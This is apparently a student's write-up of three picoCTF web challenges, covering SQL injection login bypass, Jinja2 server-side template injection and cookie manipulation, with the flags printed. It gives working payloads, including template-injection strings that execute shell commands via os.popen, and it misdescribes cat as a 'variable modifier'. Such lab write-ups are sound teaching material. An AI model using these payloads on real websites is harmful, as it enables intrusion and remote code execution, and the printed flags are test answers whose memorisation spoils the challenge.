# Challenge 1: Web Gauntlet
In this challenge, a login web page (can't be logined through valid credentials) is given in which we have to exploit the web page by beating given 5 filters.

## Flag:
```
picoCTF{y0u_m4d3_1t_79a0ddc6}
```

## My Approach:
The challenge says that login as an admin into the web page whose link was given. First, I tried simple boolean injections like: ```1=1```, ```1=2``` then some OR injections but they didn't work. Then I thought of using some admin injections as the challenge says login as an admin. I hit and tried the following injections and below mentioned injections worked successfully:
1. ```admin' --```
2. ```admin' /*```
3. ```admin';```

After the third one, none of the admin injections worked, like they were blocked after third injection, so I started with some other injections and then below one again worked. For the fourth and fifth injection, the same one injection worked 

```ad'||'min';```

After all the successful injections, I directly went through the ```filter.php``` webpage and got the flag at the bootom of the webpage.


## My Learnings:
Got to learn different types of SQL Injections and learnt how to inject into a webpage using them.

## Help taken:
Took help from ```chatgpt```, ```invicti``` and ```portswigger``` websites to get to know different types of SQL Injection codes.

## Wrong Tangents:
I was first again and again looking inside the Developers Tool and in cookies section, I was trying to change user to ADMIN in application section as it said Login as admin, which surely I was wrong.



# Challenge 2: SSTI1 
This challenge says that there's a very cool website where we can announce anything, so simply it's asking to exploit his website by doing somethings.

## Flag:
```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_09365533}
```

## My Approach:
As I opened the webpage, there's given a textbox in which writing anything displays it on the next connecting wwebpage. I started by writing by my name and seeing what actually happens. Then I googled about SSTI, what it is? I came to know that it is called Server-side Template Injection, a web injection to the browser like a cyber attack through  which one can exploit any website by exploiting its vulnerabilities and seek into the hidden or confidential data saved onto the websites.
I searched for some injection codes on google and tried them. I tried below ones:

1. ```{{7*7}}```   (it displayed 49 as its output on next page)
2. ```{{7*'7'}}```   (it displayed 7777777)
3. ```<%= 7*7 %>```  (it displayed <%= 7*7 %>)

Above codes, I got from ```Intigriti``` website.

Then I tried some sophisticated injection codes got on a website named ```YesWeHack``` and the following I tried:
1. ```{{self.__init__.__globals__.__str__()[1786:1788]}}``` (it displayed i)
2. ```{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[1786:1788]).read()}}``` (it showed file cannot reached)

I got a doubt as every code displayed something but this one directly showed can't reach. So, I searched about this code and I got to know this is a ```Jinja 2``` template code and by doing some modifications in the injection code I got while scrolling through net, I got below codes:

```{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read()}}```  (displays __pycache__ app.py flag requirements.txt)

After it displayed flag, I tried with flag instead of ls, then it again showed can't reach, then I came across a variable modifier ```cat``` which is used to concatenate individual characters to form a string, so I used it before flag and entered this injection code:

```{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read()}}```

and it displayed the flag.

## My Learnings:
Got to learn what SSTI is and about it's injection codes and Jinja 2 template for injecting into a website, also got to know about cat variable modifier.

## Reference Websites:
1. Intigriti
2. YesWeHack
3. OWASP


# Challenge 3: Cookies
In this challenge, a website is given in which it's asked to find out the best cookie to get the flag.

## Flag:
```
picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}
```

## My Approach:
As the webpage opened, it says ```Welcome to my cookie search page. See how much I like different kinds of cookies!``` and in the text box ```snickerdoodle```. I first opened the ```Developer's Tools``` in which I went to cookies secttion, in which it has only one cookie named ```name``` whose value was initialised to ```-1```. As the text box says, ```snickerdoodle```, I  first entered snickerdoodle in the text box. It says, ```I love snickerdoodle cookies!``` and a comment says, ```That is a cookie! Not very special though...```. In addition, value initialised to name changed to ```0```. Then I, one by one started updating the cookie value, first to 1, then 2, then 3 and so on and in each updation I got some names of cookies like I love this and that. At last, on the cookie value 18, I got the flag.

## My Learnings:
Got to know how to manipulate cookies at our own wish and gain useful information.

























